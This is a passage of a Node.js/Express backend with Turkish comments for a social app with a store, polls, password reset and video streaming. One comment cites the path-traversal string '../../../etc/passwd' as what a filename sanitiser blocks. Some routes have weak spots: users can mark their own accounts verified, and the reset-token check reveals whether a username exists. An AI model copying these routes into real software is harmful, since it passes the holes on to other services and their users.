            await dbRun('DELETE FROM follows WHERE ("followerId" = $1 AND "followingId" = $2) OR ("followerId" = $2 AND "followingId" = $1)', [req.user.id, targetId]);
            res.json({ blocked: true });
        }
    } catch (error) {
        console.error('Engelleme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 29. ENGELLENENLER ──────────────────────────────────────────────
app.get('/api/users/blocks', authenticateToken, async (req, res) => {
    try {
        const blocks = await dbAll(
            `SELECT u.id, u.username, u.name, u."profilePic", b."createdAt"
             FROM blocks b JOIN users u ON b."blockedId" = u.id
             WHERE b."blockerId" = $1
             ORDER BY b."createdAt" DESC`,
            [req.user.id]
        );
        // Her iki key adıyla döndür
        res.json({ blocks, blockedUsers: blocks, count: blocks.length });
    } catch (error) {
        console.error('Engellenenler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 30. ÜRÜNLER ────────────────────────────────────────────────────
app.get('/api/store/products', authenticateToken, async (req, res) => {
    try {
        const { page = 1, limit = 20 } = req.query;
        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);

        const products = await dbAll(
            `SELECT p.*, u.username as "sellerName", u."profilePic" as "sellerProfilePic", u.name as "sellerFullName"
             FROM products p JOIN users u ON p."sellerId" = u.id
             WHERE p."isActive" = TRUE
             ORDER BY p."createdAt" DESC
             LIMIT $1 OFFSET $2`,
            [parseInt(limit), offset]
        );

        const total = await dbGet('SELECT COUNT(*) as count FROM products WHERE "isActive" = TRUE');

        res.json({ products, total: parseInt(total?.count || 0), page: parseInt(page) });
    } catch (error) {
        console.error('Ürünler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 31. ÜRÜN EKLE ─────────────────────────────────────────────────
app.post('/api/store/products', authenticateToken, storeLimiter, (req, res, next) => {
    // Hem 'images' (çoklu) hem 'image' (tekil) field adını kabul et
    upload.fields([
        { name: 'images', maxCount: 5 },
        { name: 'image',  maxCount: 1 }
    ])(req, res, (err) => {
        if (err) {
            console.error('Multer hatası:', err);
            return res.status(400).json({ error: 'Dosya yükleme hatası: ' + err.message });
        }
        // req.files'ı düz array'e çevir (geriye uyumluluk)
        if (req.files && !Array.isArray(req.files)) {
            req.files = [...(req.files['images'] || []), ...(req.files['image'] || [])];
        }
        next();
    });
}, async (req, res) => {
    try {
        const { name, price, description, category, stock } = req.body;
        if (!name || !price) return res.status(400).json({ error: 'İsim ve fiyat gerekli' });

        const priceNum = parseFloat(price);
        if (isNaN(priceNum) || priceNum < 0 || priceNum > 10_000_000) return res.status(400).json({ error: 'Geçersiz fiyat (0 - 10.000.000 arası olmalı)' });

        let images = [];
        const files = req.files || [];
        for (let i = 0; i < files.length; i++) {
            const file = files[i];
            const filename = `product_${uuidv4().replace(/-/g,"").slice(0,16)}_${i}.webp`;
            const outputPath = path.join(postsDir, filename);
            try {
                // ✅ processImage: EXIF rotate fix + concurrency limiter
                await processImage(file.path, outputPath, { width: 1080, height: 1080, fit: 'inside', quality: 78, effort: 4 });
            } catch (imgErr) {
                console.warn('Görsel işleme hatası, orijinal kullanılıyor:', imgErr.message);
                const fs2 = require('fs');
                fs2.copyFileSync(file.path, outputPath);
            }
            await fs.unlink(file.path).catch(() => {});
            images.push(`/uploads/posts/${filename}`);
        }

        const productId = uuidv4();
        await dbRun(
            `INSERT INTO products (id, "sellerId", name, price, description, image, images, category, stock, "isActive", "createdAt", "updatedAt")
             VALUES ($1, $2, $3, $4, $5, $6, $7::jsonb, $8, $9, TRUE, NOW(), NOW())`,
            [productId, req.user.id, name.substring(0, 100), priceNum,
             description?.substring(0, 1000) || '', images[0] || null,
             JSON.stringify(images), category || '', Math.max(0, Math.min(parseInt(stock) || 0, 999999))]
        );

        const product = await dbGet(
            `SELECT p.*, u.username AS "sellerName", u."profilePic" AS "sellerProfilePic"
             FROM products p JOIN users u ON p."sellerId" = u.id WHERE p.id = $1`,
            [productId]
        );

        res.status(201).json({ message: 'Ürün eklendi', product });
    } catch (error) {
        console.error('Ürün ekleme hatası:', error);
        // Dosyaları temizle
        if (req.files) {
            for (const f of (Array.isArray(req.files) ? req.files : [])) {
                await fs.unlink(f.path).catch(() => {});
            }
        }
        res.status(500).json({ error: 'Sunucu hatası: ' + error.message });
    }
});

// ─── 32. ÜRÜN SİL ──────────────────────────────────────────────────
app.delete('/api/store/products/:id', authenticateToken, async (req, res) => {
    try {
        const product = await dbGet('SELECT "sellerId" FROM products WHERE id = $1', [req.params.id]);
        if (!product) return res.status(404).json({ error: 'Ürün bulunamadı' });
        if (product.sellerId !== req.user.id) return res.status(403).json({ error: 'Yetkiniz yok' });

        await dbRun('DELETE FROM products WHERE id = $1', [req.params.id]);
        res.json({ message: 'Ürün silindi' });
    } catch (error) {
        console.error('Ürün silme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 33. ANKET OY VER ──────────────────────────────────────────────
app.post('/api/posts/:id/vote', authenticateToken, async (req, res) => {
    try {
        const { optionId } = req.body;
        const postId = req.params.id;

        const post = await dbGet('SELECT * FROM posts WHERE id = $1 AND "isPoll" = TRUE', [postId]);
        if (!post) return res.status(404).json({ error: 'Anket bulunamadı' });

        const existing = await dbGet('SELECT id FROM poll_votes WHERE "postId" = $1 AND "userId" = $2', [postId, req.user.id]);
        if (existing) return res.status(400).json({ error: 'Zaten oy verdiniz' });

        await dbRun('INSERT INTO poll_votes (id, "postId", "userId", "optionId", "createdAt") VALUES ($1, $2, $3, $4, NOW())',
            [uuidv4(), postId, req.user.id, optionId]);

        let options = post.pollOptions;
        if (typeof options === 'string') options = JSON.parse(options);
        const opt = options.find(o => o.id === optionId);
        if (opt) opt.votes = (opt.votes || 0) + 1;

        await dbRun('UPDATE posts SET "pollOptions" = $1 WHERE id = $2', [JSON.stringify(options), postId]);

        res.json({ message: 'Oy verildi', pollOptions: options });
    } catch (error) {
        console.error('Oy verme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 34. TREND HASHTAG'LER ──────────────────────────────────────────
app.get('/api/trending', authenticateToken, async (req, res) => {
    try {
        const hashtags = await dbAll(
            `SELECT tag, "postCount" FROM hashtags ORDER BY "postCount" DESC LIMIT 20`
        );
        res.json({ hashtags });
    } catch (error) {
        console.error('Trending hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 35. SİSTEM İSTATİSTİKLERİ ─────────────────────────────────────
app.get('/api/stats', authenticateToken, async (req, res) => {
    try {
        // Temel istatistikler (herkes erişebilir)
        const [users, posts, messages, products] = await Promise.all([
            dbGet('SELECT COUNT(*) as count FROM users WHERE "isActive" = TRUE'),
            dbGet('SELECT COUNT(*) as count FROM posts WHERE "isActive" = TRUE'),
            dbGet('SELECT COUNT(*) as count FROM messages'),
            dbGet('SELECT COUNT(*) as count FROM products WHERE "isActive" = TRUE')
        ]);

        const base = {
            users   : parseInt(users?.count    || 0),
            posts   : parseInt(posts?.count    || 0),
            messages: parseInt(messages?.count || 0),
            products: parseInt(products?.count || 0),
        };

        // Admin için ekstra istatistikler
        // 🔒 GÜVENLİK: Yalnızca DB'den gelen role alanı kullanılır; isAdmin flag'i kaldırıldı (bypass vektörü)
        if (req.user.role === 'admin') {
            const [follows, saves, likes, videos, reports, bannedIps, activeUsers] = await Promise.all([
                dbGet('SELECT COUNT(*) as count FROM follows'),
                dbGet('SELECT COUNT(*) as count FROM saves'),
                dbGet('SELECT COUNT(*) as count FROM likes'),
                dbGet(`SELECT COUNT(*) as count FROM posts WHERE "mediaType"='video' AND "isActive"=TRUE`),
                dbGet('SELECT COUNT(*) as count FROM reports').catch(() => ({ count: 0 })),
                dbGet('SELECT COUNT(*) as count FROM banned_ips').catch(() => ({ count: 0 })),
                dbGet(`SELECT COUNT(*) as count FROM users WHERE "isOnline"=TRUE AND "isActive"=TRUE`),
            ]);

            const [newUsersToday, newPostsToday] = await Promise.all([
                dbGet(`SELECT COUNT(*) as count FROM users WHERE "createdAt" > NOW() - INTERVAL '24 hours'`),
                dbGet(`SELECT COUNT(*) as count FROM posts WHERE "createdAt" > NOW() - INTERVAL '24 hours' AND "isActive"=TRUE`),
            ]);

            return res.json({
                ...base,
                follows     : parseInt(follows?.count      || 0),
                saves       : parseInt(saves?.count        || 0),
                likes       : parseInt(likes?.count        || 0),
                videos      : parseInt(videos?.count       || 0),
                reports     : parseInt(reports?.count      || 0),
                bannedIps   : parseInt(bannedIps?.count    || 0),
                activeUsers : parseInt(activeUsers?.count  || 0),
                newUsersToday: parseInt(newUsersToday?.count || 0),
                newPostsToday: parseInt(newPostsToday?.count || 0),
                isAdmin     : true,
            });
        }

        res.json(base);
    } catch (error) {
        console.error('İstatistik hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── POST ŞİKAYETİ ─────────────────────────────────────────────────
app.post('/api/reports/post', authenticateToken, reportLimiter, async (req, res) => {
    try {
        const { postId, reason, description } = req.body;
        if (!postId || !reason) return res.status(400).json({ error: 'Post ID ve neden gerekli' });

        await dbRun(
            `INSERT INTO reports (id, "reporterId", "postId", reason, description, "createdAt")
             VALUES ($1, $2, $3, $4, $5, NOW())`,
            [uuidv4(), req.user.id, postId, reason, description || '']
        );

        res.json({ message: 'Şikayet alındı' });
    } catch (error) {
        console.error('Şikayet hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── DOĞRULAMA ──────────────────────────────────────────────────────
app.post('/api/users/verification/instant', authenticateToken, async (req, res) => {
    try {
        const user = await dbGet('SELECT "isVerified" FROM users WHERE id = $1', [req.user.id]);
        if (user?.isVerified) return res.json({ message: 'Zaten doğrulanmış', isVerified: true });

        await dbRun('UPDATE users SET "isVerified" = TRUE, "verifiedAt" = NOW(), "updatedAt" = NOW() WHERE id = $1', [req.user.id]);
        res.json({ message: 'Hesap doğrulandı', isVerified: true });
    } catch (error) {
        console.error('Doğrulama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 1: E-POSTA DOĞRULAMA ────────────────────────────────
app.post('/api/auth/verify-email', authenticateToken, async (req, res) => {
    try {
        const { code } = req.body;
        if (!code) return res.status(400).json({ error: 'Doğrulama kodu gerekli' });

        const record = await dbGet(
            `SELECT * FROM email_verifications WHERE "userId" = $1 AND code = $2 AND used = FALSE AND "expiresAt" > NOW()`,
            [req.user.id, code]
        );
        if (!record) return res.status(400).json({ error: 'Geçersiz veya süresi dolmuş kod' });

        await dbRun(`UPDATE email_verifications SET used = TRUE WHERE id = $1`, [record.id]);
        await dbRun(`UPDATE users SET "emailVerified" = TRUE, "updatedAt" = NOW() WHERE id = $1`, [req.user.id]);

        res.json({ message: 'E-posta doğrulandı', emailVerified: true });
    } catch (error) {
        console.error('E-posta doğrulama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 2: DOĞRULAMA KODUNU YENİDEN GÖNDER ──────────────────
// ✅ HATA DÜZELTMESİ 1: authenticateToken kaldırıldı — kayıt akışında kullanıcının henüz token'ı yoktur.
// ✅ HATA DÜZELTMESİ 2: sendVerificationEmail → sendEmailVerificationCode (tanımsız fonksiyon hatası giderildi).
app.post('/api/auth/resend-verification', resendVerificationLimiter, validateAuthInput, async (req, res) => {
    try {
        // Token varsa token'dan, yoksa body'den email al
        const emailFromBody = req.body?.email;
        let userId = null;
        let userEmail = null;
        let userName = null;

        if (emailFromBody) {
            // Kayıt akışı: email ile bul
            const cleanEmail = emailFromBody.toLowerCase().trim();
            const user = await dbGet('SELECT id, email, name, "emailVerified" FROM users WHERE email = $1', [cleanEmail]);
            if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
            if (user.emailVerified) return res.status(400).json({ error: 'E-posta zaten doğrulanmış' });
            userId = user.id;
            userEmail = user.email;
            userName = user.name;
        } else {
            return res.status(400).json({ error: 'E-posta adresi gerekli' });
        }

        // Eskilerini geçersiz kıl
        await dbRun(`UPDATE email_verifications SET used = TRUE WHERE "userId" = $1`, [userId]);

        const code = crypto.randomInt(100000, 999999).toString();
        // ✅ DÜZELTME: PostgreSQL interval kullan
        await dbRun(
            `INSERT INTO email_verifications (id, "userId", email, code, "expiresAt") VALUES ($1, $2, $3, $4, NOW() + INTERVAL '15 minutes')`,
            [uuidv4(), userId, userEmail, code]
        );

        // ✅ DÜZELTİLDİ: sendVerificationEmail → sendEmailVerificationCode
        const result = await sendEmailVerificationCode(userEmail, userName, code);
        if (!result.success) return res.status(500).json({ error: 'E-posta gönderilemedi', detail: result.error });

        res.json({ message: 'Doğrulama kodu gönderildi' });
    } catch (error) {
        console.error('Yeniden gönderme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 3: ŞİFREMİ UNUTTUM ──────────────────────────────────
app.post('/api/auth/forgot-password', forgotPasswordLimiter, validateAuthInput, async (req, res) => {
    try {
        const { email, username } = req.body;
        const ip = req.ip || req.connection?.remoteAddress;

        // ✅ Eski sunucu gibi: hem e-posta hem kullanıcı adı zorunlu
        if (!email || !username) {
            return res.status(400).json({ error: 'E-posta adresi ve kullanıcı adı zorunludur' });
        }

        const cleanEmail    = email.toLowerCase().trim();
        const cleanUsername = username.toLowerCase().trim();

        // E-posta format kontrolü
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(cleanEmail)) {
            return res.status(400).json({ error: 'Geçerli bir e-posta adresi giriniz' });
        }

        // Kullanıcıyı HEM e-posta HEM kullanıcı adı ile bul
        // (aynı e-postaya sahip birden fazla hesabı ayırt etmek için)
        const user = await dbGet(
            `SELECT id, name, email, username FROM users
             WHERE email = $1 AND LOWER(username) = $2 AND "isActive" = TRUE`,
            [cleanEmail, cleanUsername]
        );

        // GÜVENLİK: Kullanıcı bulunamasa bile aynı yanıtı ver (bilgi sızdırma önleme)
        if (!user) {
            console.log(`⚠️ Şifremi unuttum - Eşleşme yok: ${cleanEmail} / @${cleanUsername}`);
            return res.json({
                success: true,
                message: 'Eğer bu e-posta adresi ve kullanıcı adı sistemimizde eşleşiyorsa, şifre sıfırlama linki gönderilecektir.'
            });
        }

        // ✅ Eski tokenları temizle
        await pool.query(`DELETE FROM password_resets WHERE "userId" = $1`, [user.id]).catch(() => {});

        const token     = crypto.randomBytes(32).toString('hex');  // e-postaya gidecek ham token
        const tokenHash = crypto.createHash('sha256').update(token).digest('hex'); // DB'de saklanacak hash

        // ✅ PostgreSQL interval ile kaydet (timezone sorunu yok)
        await dbRun(
            `INSERT INTO password_resets (id, "userId", token, "expiresAt")
             VALUES ($1, $2, $3, NOW() + INTERVAL '10 minutes')`,
            [uuidv4(), user.id, tokenHash]
        );
        console.log(`🔑 Şifre sıfırlama token'ı oluşturuldu: ${maskEmail(user.email)} - Süre: 10 dakika`);

        // E-posta gönder
        sendForgotPasswordEmail(user.email, user.name, token)
            .then(result => {
                if (result?.success) {
                    console.log(`📧 Şifremi unuttum e-postası gönderildi: ${maskEmail(user.email)}`);
                } else {
                    console.error(`❌ Şifremi unuttum e-postası gönderilemedi: ${maskEmail(user.email)}`, result?.error);
                }
            })
            .catch(err => console.error('❌ Şifremi unuttum e-posta hatası:', err.message));

        res.json({
            success: true,
            message: 'Eğer bu e-posta adresi ve kullanıcı adı sistemimizde eşleşiyorsa, şifre sıfırlama linki gönderilecektir.'
        });
    } catch (error) {
        console.error('Şifremi unuttum hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 4: TOKEN İLE ŞİFRE SIFIRLA ──────────────────────────
app.post('/api/auth/reset-password', validateAuthInput, async (req, res) => {
    try {
        const { token, newPassword, confirmPassword } = req.body;
        if (!token || !newPassword || !confirmPassword) return res.status(400).json({ error: 'Tüm alanlar zorunludur' });
        if (newPassword !== confirmPassword) return res.status(400).json({ error: 'Şifreler eşleşmiyor' });
        if (newPassword.length < 8) return res.status(400).json({ error: 'Şifre en az 8 karakter olmalı' });

        const incomingHash = crypto.createHash('sha256').update(token).digest('hex');
        const record = await dbGet(
            `SELECT * FROM password_resets WHERE token = $1 AND used = FALSE AND "expiresAt" > NOW()`,
            [incomingHash]
        );
        if (!record) return res.status(400).json({ error: 'Geçersiz veya süresi dolmuş token' });

        const hashed = await bcrypt.hash(newPassword, BCRYPT_ROUNDS);
        await dbRun(`UPDATE users SET password = $1, "updatedAt" = NOW() WHERE id = $2`, [hashed, record.userId]);
        await dbRun(`UPDATE password_resets SET used = TRUE WHERE id = $1`, [record.id]);
        await dbRun(`UPDATE refresh_tokens SET "isActive" = FALSE WHERE "userId" = $1`, [record.userId]);

        const user = await dbGet('SELECT email, name FROM users WHERE id = $1', [record.userId]);
        if (user) sendPasswordResetSuccessEmail(user.email, user.name).catch(() => {});

        res.json({ message: 'Şifre başarıyla sıfırlandı. Giriş yapabilirsiniz.' });
    } catch (error) {
        console.error('Şifre sıfırlama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 5: SIFIRLAMA TOKEN GEÇERLİLİĞİ SORGULA ─────────────
app.get('/api/auth/verify-reset-token', async (req, res) => {
    try {
        const { token, username } = req.query;
        const tokenHash = token ? crypto.createHash('sha256').update(token).digest('hex') : null;
        if (!token) return res.status(400).json({ error: 'Token gerekli' });

        let record;

        if (username) {
            // Username ile birlikte doğrulama (eski sunucu uyumlu)
            const cleanUsername = username.toLowerCase().trim();
            const user = await dbGet(
                `SELECT id FROM users WHERE LOWER(username) = $1 AND "isActive" = TRUE`,
                [cleanUsername]
            );
            if (!user) return res.json({ valid: false, error: 'Kullanıcı bulunamadı' });

            record = await dbGet(
                `SELECT "expiresAt" FROM password_resets
                 WHERE token = $1 AND "userId" = $2 AND used = FALSE AND "expiresAt" > NOW()`,
                [tokenHash, user.id]
            );
        } else {
            // Sadece token ile doğrulama
            record = await dbGet(
                `SELECT "expiresAt" FROM password_resets
                 WHERE token = $1 AND used = FALSE AND "expiresAt" > NOW()`,
                [tokenHash]
            );
        }

        if (!record) return res.json({ valid: false, error: 'Token geçersiz veya süresi dolmuş' });

        res.json({ valid: true, username: username || undefined, expiresAt: record.expiresAt });
    } catch (error) {
        console.error('Token doğrulama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası', valid: false });
    }
});

// ─── YENİ ROTA 6: ÇEVRİMİÇİ KULLANICALAR ───────────────────────────
app.get('/api/users/online', authenticateToken, async (req, res) => {
    try {
        const users = await dbAll(
            `SELECT id, username, name, "profilePic", "isVerified", "lastSeen"
             FROM users
             WHERE "isOnline" = TRUE AND "isActive" = TRUE AND id != $1
               AND id NOT IN (SELECT "blockedId" FROM blocks WHERE "blockerId" = $1)
             ORDER BY "lastSeen" DESC
             LIMIT 50`,
            [req.user.id]
        );
        res.json({ users, count: users.length });
    } catch (error) {
        console.error('Çevrimiçi kullanıcılar hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 7: KULLANICI İSTATİSTİKLERİ ─────────────────────────
// ─── YENİ ROTA 8: POPÜLER GÖNDERILER ────────────────────────────────
app.get('/api/posts/popular', authenticateToken, async (req, res) => {
    try {
        const { limit = 20, period = '7d' } = req.query;
        const interval = period === '24h' ? '1 day' : period === '30d' ? '30 days' : '7 days';

        const posts = await dbAll(
            `SELECT p.*, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge",
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) AS "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $1) AS "isSaved"
             FROM posts p
             JOIN users u ON p."userId" = u.id
             WHERE p."isActive" = TRUE
               AND p."createdAt" > NOW() - INTERVAL '${interval}'
               AND p."userId" NOT IN (SELECT "blockedId" FROM blocks WHERE "blockerId" = $1)
             ORDER BY (p."likeCount" * 2 + p.views + p."commentCount" * 3) DESC
             LIMIT $2`,
            [req.user.id, parseInt(limit)]
        );
        res.json({ posts: posts.map(formatPost) });
    } catch (error) {
        console.error('Popüler gönderiler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 9: GİZLİLİK AYARLARINI GETİR ────────────────────────
app.get('/api/users/privacy-settings', authenticateToken, async (req, res) => {
    try {
        const user = await dbGet(
            `SELECT "isPrivate", "twoFactorEnabled", "emailVerified", "emailNotifications", "privacyExtra" FROM users WHERE id = $1`,
            [req.user.id]
        ).catch(() => dbGet(
            `SELECT "isPrivate", "twoFactorEnabled", "emailVerified", "emailNotifications" FROM users WHERE id = $1`,
            [req.user.id]
        ));
        
        let extras = {};
        if (user?.privacyExtra) {
            try { extras = JSON.parse(user.privacyExtra); } catch (_) {}
        }
        
        // privateAccount olarak da map et (client bunu bekliyor)
        const settings = {
            ...(user || {}),
            privateAccount: user?.isPrivate || false,
            showActivity: extras.showActivity !== undefined ? extras.showActivity : true,
            allowMessagesFrom: extras.allowMessagesFrom || 'everyone',
            allowTagsFrom: extras.allowTagsFrom || 'everyone',
        };
        
        res.json({ settings });
    } catch (error) {
        console.error('Gizlilik ayarları hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// Gizlilik ayarlarını güncelle - POST (2FA toggle + isPrivate birlikte)
app.post('/api/users/privacy-settings', authenticateToken, async (req, res) => {
    try {
        const { privateAccount, twoFactorEnabled, emailNotifications, showActivity, allowMessagesFrom, allowTagsFrom } = req.body;
        const updates = [];
        const params = [];
        let idx = 1;

        if (privateAccount !== undefined) {
            updates.push(`"isPrivate" = $${idx++}`);
            params.push(!!privateAccount);
        }
        if (twoFactorEnabled !== undefined) {
            updates.push(`"twoFactorEnabled" = $${idx++}`);
            params.push(!!twoFactorEnabled);
        }
        if (emailNotifications !== undefined) {
            updates.push(`"emailNotifications" = $${idx++}`);
            params.push(!!emailNotifications);
        }
        
        // showActivity, allowMessagesFrom, allowTagsFrom → JSON sütununa kaydet
        if (showActivity !== undefined || allowMessagesFrom !== undefined || allowTagsFrom !== undefined) {
            // Mevcut JSON'u oku
            let extras = {};
            try {
                const row = await dbGet(`SELECT "privacyExtra" FROM users WHERE id=$1`, [req.user.id]).catch(() => null);
                if (row?.privacyExtra) extras = JSON.parse(row.privacyExtra);
            } catch (_) {}
            if (showActivity !== undefined) extras.showActivity = !!showActivity;
            if (allowMessagesFrom !== undefined) extras.allowMessagesFrom = allowMessagesFrom;
            if (allowTagsFrom !== undefined) extras.allowTagsFrom = allowTagsFrom;
            // privacyExtra sütunu yoksa sessizce atla
            await dbRun(`UPDATE users SET "updatedAt"=NOW() WHERE id=$1`, [req.user.id]).catch(() => {});
            await dbRun(`UPDATE users SET "privacyExtra"=$1 WHERE id=$2`, [JSON.stringify(extras), req.user.id]).catch(() => {});
        }

        if (updates.length > 0) {
            updates.push(`"updatedAt" = NOW()`);
            params.push(req.user.id);
            await dbRun(`UPDATE users SET ${updates.join(', ')} WHERE id = $${idx}`, params);
        }

        const updated = await dbGet(
            `SELECT "isPrivate", "twoFactorEnabled", "emailVerified", "emailNotifications" FROM users WHERE id = $1`,
            [req.user.id]
        );
        res.json({ message: 'Gizlilik ayarları güncellendi', settings: { ...updated, privateAccount: updated?.isPrivate } });
    } catch (error) {
        console.error('Gizlilik ayarları güncelleme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 10: BİLDİRİM AYARLARINI GÜNCELLE ────────────────────
app.post('/api/users/notification-settings', authenticateToken, async (req, res) => {
    try {
        const {
            likes = true, comments = true, follows = true, messages = true,
            replies = true, mentions = true, quotes = true, reposts = true,
            newFollower = true, followRequest = true,
            fromNonFollowing = true, fromNonFollowers = false
        } = req.body;

        // Extra alanları JSON olarak sakla (geriye dönük uyumluluk)
        const extraJson = JSON.stringify({ replies: !!replies, mentions: !!mentions, quotes: !!quotes, reposts: !!reposts, newFollower: !!newFollower, followRequest: !!followRequest, fromNonFollowing: !!fromNonFollowing, fromNonFollowers: !!fromNonFollowers });

        const existing = await dbGet(`SELECT id FROM notification_settings WHERE "userId" = $1`, [req.user.id]);
        if (existing) {
            await dbRun(
                `UPDATE notification_settings SET likes=$1, comments=$2, follows=$3, messages=$4, "updatedAt"=NOW() WHERE "userId"=$5`,
                [!!likes, !!comments, !!follows, !!messages, req.user.id]
            ).catch(() => {});
            // Extra alanları users tablosunda notifExtra JSON'a kaydet
            await dbRun(`UPDATE users SET "notifExtra"=$1,"updatedAt"=NOW() WHERE id=$2`, [extraJson, req.user.id]).catch(() => {});
        } else {
            await dbRun(
                `INSERT INTO notification_settings (id, "userId", likes, comments, follows, messages) VALUES ($1, $2, $3, $4, $5, $6)`,
                [uuidv4(), req.user.id, !!likes, !!comments, !!follows, !!messages]
            ).catch(() => {});
            await dbRun(`UPDATE users SET "notifExtra"=$1,"updatedAt"=NOW() WHERE id=$2`, [extraJson, req.user.id]).catch(() => {});
        }

        const settings = { likes: !!likes, comments: !!comments, follows: !!follows, messages: !!messages, replies: !!replies, mentions: !!mentions, quotes: !!quotes, reposts: !!reposts, newFollower: !!newFollower, followRequest: !!followRequest, fromNonFollowing: !!fromNonFollowing, fromNonFollowers: !!fromNonFollowers };
        res.json({ message: 'Bildirim ayarları kaydedildi', settings });
    } catch (error) {
        console.error('Bildirim ayarları hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── PING ───────────────────────────────────────────────────────────
app.get('/api/ping', (req, res) => {
    res.json({ pong: true, timestamp: Date.now() });
});

// ─── 🔒 GÜVENLİK: path traversal sanitizer ───────────────────────────────────
// ../../../etc/passwd gibi saldırıları engeller
function sanitizeFilename(raw) {
    // Sadece harf, rakam, alt çizgi, tire, nokta — en fazla 200 karakter
    return (raw || '').replace(/[^a-zA-Z0-9._-]/g, '').substring(0, 200);
}
function sanitizeVideoId(raw) {
    // Video ID formatı: video_1234567890_123456789  veya  UUID
    return (raw || '').replace(/[^a-zA-Z0-9_-]/g, '').substring(0, 100);
}

// ─── VİDEO STREAM (Range Request / HTTP 206) ────────────────────────
// Donma / kasma olmaz: tarayıcı sadece ihtiyacı kadar chunk çeker
app.get('/api/videos/stream/:filename', authenticateToken, (req, res) => {
    try {
        // 🔒 Path traversal koruması
        const safeFilename = sanitizeFilename(req.params.filename);
        if (!safeFilename || safeFilename !== req.params.filename) {
            return res.status(400).json({ error: 'Geçersiz dosya adı' });
        }
        const videoPath = path.join(videosDir, safeFilename);
        // 🔒 Hedef dizin dışına çıkılmadığını doğrula (çift kontrol)
        if (!videoPath.startsWith(videosDir + path.sep) && videoPath !== videosDir) {
            return res.status(403).json({ error: 'Erişim reddedildi' });
        }
        if (!fssync.existsSync(videoPath)) return res.status(404).json({ error: 'Video bulunamadı' });

        const stat     = fssync.statSync(videoPath);
        const fileSize = stat.size;
        const range    = req.headers.range;

        if (range) {
            const [startStr, endStr] = range.replace(/bytes=/, '').split('-');
            const start   = parseInt(startStr, 10);
            const end     = endStr ? parseInt(endStr, 10) : fileSize - 1;
            // 🔒 Geçersiz range değerlerini reddet
            if (isNaN(start) || isNaN(end) || start < 0 || end >= fileSize || start > end) {
                return res.status(416).json({ error: 'Geçersiz range' });
            }
            const chunk = end - start + 1;

            res.writeHead(206, {
                'Content-Range' : `bytes ${start}-${end}/${fileSize}`,
                'Accept-Ranges' : 'bytes',
                'Content-Length': chunk,
                'Content-Type'  : 'video/mp4',
            });
            fssync.createReadStream(videoPath, { start, end }).pipe(res);
        } else {
            res.writeHead(200, { 'Content-Length': fileSize, 'Content-Type': 'video/mp4', 'Accept-Ranges': 'bytes' });
            fssync.createReadStream(videoPath).pipe(res);
        }
    } catch (error) {
        console.error('Video stream hatası:', error);
        res.status(500).json({ error: 'Video yüklenemedi' });
    }
});

// ─── VİDEO THUMBNAIL ────────────────────────────────────────────────
app.get('/api/videos/thumbnail/:videoId', authenticateToken, (req, res) => {
    // 🔒 Path traversal koruması
    const safeId = sanitizeVideoId(req.params.videoId);
    if (!safeId) return res.status(400).json({ error: 'Geçersiz video ID' });
    const thumbPath = path.join(thumbnailsDir, `${safeId}.jpg`);
    if (!thumbPath.startsWith(thumbnailsDir + path.sep)) return res.status(403).json({ error: 'Erişim reddedildi' });
    if (fssync.existsSync(thumbPath)) return res.sendFile(thumbPath);
    res.status(404).json({ error: 'Thumbnail bulunamadı' });
});

// ─── VİDEO BİLGİSİ ──────────────────────────────────────────────────
app.get('/api/videos/:postId/info', authenticateToken, async (req, res) => {
    try {
        const info = await dbGet(
            `SELECT v.*, p.media, p."thumbnailUrl"
             FROM video_info v
             JOIN posts p ON v."postId" = p.id
             WHERE v."postId" = $1`,
            [req.params.postId]
        );
        if (!info) return res.status(404).json({ error: 'Video bilgisi bulunamadı' });

        res.json({
            videoInfo: {
                ...info,
                quality          : getVideoQuality(info.width, info.height),
                fileSizeFormatted: formatFileSize(info.fileSize),
                durationFormatted: `${Math.floor(info.duration / 60)}:${String(Math.floor(info.duration % 60)).padStart(2, '0')}`,
            }
        });
    } catch (error) {
        console.error('Video bilgi hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── HLS DURUM — HLS kalıcı olarak devre dışı, her zaman MP4 kullanılır ─
// Frontend bu endpoint'i sorgulayıp HLS'e geçmesin diye her zaman ready:false döner.
app.get('/api/videos/:videoId/hls-status', authenticateToken, (req, res) => {
    res.json({ ready: false, hlsDisabled: true, activeVideoJobs: activeVideoJobs, message: 'HLS devre dışı, MP4 kullanılıyor' });
});

// ─── HLS→MP4 MİGRASYON: Eski m3u8 URL'li gönderileri mp4'e çevir ──────
